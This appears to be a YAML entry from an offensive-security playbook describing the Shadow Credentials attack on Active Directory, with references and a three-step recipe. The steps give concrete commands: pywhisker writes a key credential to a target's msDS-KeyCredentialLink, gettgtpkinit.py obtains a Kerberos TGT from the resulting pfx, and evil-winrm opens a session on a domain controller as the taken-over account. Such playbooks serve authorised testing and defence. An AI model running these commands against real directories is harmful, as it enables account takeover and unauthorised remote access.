title: Shadow Credentials Attack
category: 
  - AD:
    - ACL  
tactic: Privilege Escalation
tags: []
description:
  - title: Overview
    content: In some cases it is possible to add "Key Credentials" to the attribute msDS-KeyCredentialLink of the 
      target user/computer object and then perform Kerberos authentication as that account using PKINIT.
    references:
      - type: link
        value: https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
      - type: link
        value: https://github.com/eladshamir/Whisker

steps:
  - description: Create and add a certificate to the object`s msDS-KeyCredentialLink attribute
    options: 
      - tool: 
        usage: pywhisker.py -d "domain.com" -u "user" -p 'P@ssw0rd' --target "winrm_user" --action "add" -k
        comments: 
  
  - description: Use the pfx file to get a TGT using gettgtpkinit.py
    options: 
      - tool: PKINITtools/gettgtpkinit.py
        usage: python3 gettgtpkinit.py domain.com/winrm_user -cert-pfx wAyBqump.pfx -pfx-pass OOMH7xA1c7yonbLr7EMM winrm_user.ccache
        comments: 
  
  - description: Connect using any of tools supporting kerberos
    options: 
      - tool:  evil-winrm
        usage: KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.domain.com -r domain.com -u winrm_user
        comments: 
          
comments:
  